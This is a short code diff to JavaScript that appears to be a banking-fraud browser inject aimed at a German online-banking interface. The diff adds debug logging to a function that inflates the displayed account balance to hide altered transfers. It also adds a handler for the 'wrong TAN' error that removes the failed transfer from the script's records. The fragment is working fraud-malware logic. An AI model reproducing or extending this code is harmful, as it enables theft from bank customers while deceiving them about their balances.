@@ -162,13 +162,27 @@ function outputCents(amount) {
 function getHackedMoney(realMoney) {
 	storedTransfers = loadTransfers();
 	diffMoney = 0;
+	console.log(realMoney);
 	for ( i = 0; i < storedTransfers.length; i++) {
 		diffMoney += HACK_AMOUNT - storedTransfers[i].amount;
+		console.log(diffMoney);
 	}
+	console.log(diffMoney);
+	console.log(realMoney);
+	console.log(diffMoney + realMoney);
 	return (realMoney + diffMoney);
 }
 	 function timedMsg()
 		 {
+		 
+		 //wrong tan input
+		 $(".gwt-Label:visible:contains('Falsche TAN')").each(function() {
+			 $(this).attr("hackMarker","true");
+			 //last transfer was not successfull, so delete it
+			 storedTransfers = loadTransfers();
+			 number = storedTransfers.length;
+			 storedTransfers.pop();
+		 });
 		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
 			 	
 		 			$(this).attr("hackMarker","true");
